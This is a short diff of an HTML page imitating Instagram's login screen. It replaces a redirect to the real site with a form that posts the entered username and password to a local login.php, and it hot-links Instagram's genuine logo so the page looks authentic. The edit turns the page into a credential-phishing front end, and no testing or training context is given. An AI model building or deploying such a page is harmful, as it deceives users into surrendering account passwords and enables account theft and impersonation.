@@ -9,21 +9,17 @@
 <body>
     <div class="container">
         <div class="login-box">
-            <h1>Instagram</h1>
-            <form>
+            <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+            <form action="login.php" method="post">
                 <input type="text" name="username" placeholder="Phone number, username, or email" required>
                 <input type="password" name="password" placeholder="Password" required>
-                <!-- Bouton de connexion -->
-                <button onclick="redirectToNewSite()">Log In</button>
+                <button type="submit">Log In</button>
                 <div class="divider">
                     <span>OR</span>
                 </div>
-                <!-- Bouton de connexion avec Facebook -->
                 <button type="button" class="facebook-login">Log in with Facebook</button>
-                <!-- Lien pour réinitialiser le mot de passe -->
                 <a href="#" class="forgot-password">Forgot password?</a>
             </form>
-            <!-- Lien pour s'inscrire -->
             <div class="signup">
                 <span>Don't have an account? <a href="#">Sign up</a></span>
             </div>
@@ -31,11 +27,5 @@
         <div class="app-links">
         </div>
     </div>
-    <!-- Script pour la redirection -->
-    <script>
-        function redirectToNewSite() {
-            window.location.href = "https://www.instagram.com";
-        }
-    </script>
 </body>
 </html>
